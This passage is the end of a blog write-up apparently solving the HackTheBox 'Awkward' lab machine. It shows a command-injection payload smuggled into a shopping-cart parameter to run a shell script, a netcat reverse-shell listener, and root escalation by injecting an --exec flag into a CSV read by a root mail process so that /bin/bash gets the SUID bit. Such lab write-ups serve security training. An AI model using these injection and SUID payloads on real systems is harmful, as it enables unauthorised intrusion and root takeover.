<span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/var</span><span style="color:#E1E4E8">/www/store$ cat cart/c32c-8d49-752-e3d9</span></span>
<span class="line"><span style="color:#F97583">***</span><span style="color:#E1E4E8">Hat Valley Cart</span><span style="color:#F97583">***</span></span>
<span class="line"><span style="color:#E1E4E8">item_id</span><span style="color:#F97583">=</span><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">&#39; -e &quot;1e /tmp/shell.sh&quot; /tmp/shell.sh &#39;</span><span style="color:#F97583">&amp;</span><span style="color:#E1E4E8">item_name</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">Yellow Beanie</span><span style="color:#F97583">&amp;</span><span style="color:#E1E4E8">item_brand</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">Good Doggo</span><span style="color:#F97583">&amp;</span><span style="color:#E1E4E8">item_price</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$39.</span><span style="color:#79B8FF">90</span></span></code></pre>
<p>Before deleting the cart item, check your <code>netcat</code> is listening</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">❯ nc </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">nvlp </span><span style="color:#79B8FF">9001</span></span></code></pre>
<p>Now click on delete and capture the <code>request</code> inside the <code>burp</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web20.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Change the <code>item parameter</code> like this</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">item</span><span style="color:#F97583">=</span><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">&#39;+-e+&quot;1e+/tmp/shell.sh&quot;+/tmp/shell.sh+&#39;</span><span style="color:#F97583">&amp;</span><span style="color:#E1E4E8">user</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">c32c</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">8d49</span><span style="color:#F97583">-</span><span style="color:#79B8FF">752</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">e3d9</span><span style="color:#F97583">&amp;</span><span style="color:#E1E4E8">action</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">delete_item</span></span></code></pre>
<p>Send the <code>request</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/burp.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>And we got the <code>shell</code> as <code>www-data</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd7.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Now let’s run <code>pspy</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd8.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>And we can see that <code>inotifywait</code> is monitoring a file called <code>leave_requests.csv</code> inside <code>/var/www/private/</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd9.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Let’s add something in the file and see the <code>behavior</code>
And we can see its using <code>mail</code> command with <code>root privilege</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd10.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Link : <a href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>
<p>GTFO bins give us the <code>syntax</code> which we can use to run commands with <code>root privilege</code>
Let’s create a file called <code>priv.sh</code> and add the content which will give the <code>/bin/bash</code> binary <code>suid bit</code> privilege</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tmp$ nano priv.sh</span></span>
<span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tmp$ chmod </span><span style="color:#F97583">+</span><span style="color:#E1E4E8">x priv.sh</span></span>
<span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tmp$ cat priv.sh</span></span>
<span class="line"><span style="color:#E1E4E8">#</span><span style="color:#F97583">!/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span></span>
<span class="line"><span style="color:#E1E4E8">chmod </span><span style="color:#F97583">+</span><span style="color:#E1E4E8">s </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span></span></code></pre>
<p>Add the <code>--exec</code> flag inside the <code>leave_requests.csv</code> file</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">www</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">data@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">~/</span><span style="color:#E1E4E8">private$ echo </span><span style="color:#9ECBFF">&#39;&quot; --exec=&quot;</span><span style="color:#79B8FF">\!</span><span style="color:#9ECBFF">/tmp/priv.sh&quot;&#39;</span><span style="color:#F97583"> &gt;&gt;</span><span style="color:#E1E4E8"> leave_requests.csv</span></span></code></pre>
<p>And boom 🎉 we got the <code>root.txt</code></p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/cmd11.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">  </div> <!-- <GiscusComment client:only="react" />
    <div class="text-sm text-gray-700 dark:text-gray-300">
      <a
        href={`https://mobile.twitter.com/search?q=${encodeURIComponent(
          `https://0xdedinfosec.vercel.app/blog/${slug}`
        )}`}
        target="_blank"
        rel="noopener noreferrer"
      >
        {"Discuss on Twitter"}
      </a>
      {` • `}
      <a
        href="https://github.com/0xdedinfosec/0xdedinfosec-astro"
        target="_blank"
        rel="noopener noreferrer"
      >
        {"Suggest Change"}
      </a>
    </div> --> </article>   </main> <footer class="flex flex-col justify-center items-start max-w-2xl mx-auto w-full mb-8"> <hr class="w-full border-t border-gray-200 dark:border-gray-800 mb-8"> <div class="w-full max-w-2xl grid grid-cols-1 gap-4 pb-16 sm:grid-cols-3"> <div class="flex flex-col space-y-4"> <a href="/" class="text-gray-500 hover:text-gray-600 transition">
Home
</a> </div> <div class="flex flex-col space-y-4"> <a href="/blog" class="text-gray-500 hover:text-gray-600 transition">
Blog
</a> </div> </div> </footer> </div> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).only=e;window.dispatchEvent(new Event("astro:only"));})();;(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="AKUvh" component-url="/astro/ScrollTopAndComment.DP82tVpA.js" component-export="default" renderer-url="/astro/client.D5VCDl9Y.js" props="{}" ssr client="only" opts="{&quot;name&quot;:&quot;ScrollTopAndComment&quot;,&quot;value&quot;:&quot;react&quot;}"></astro-island> </body></html>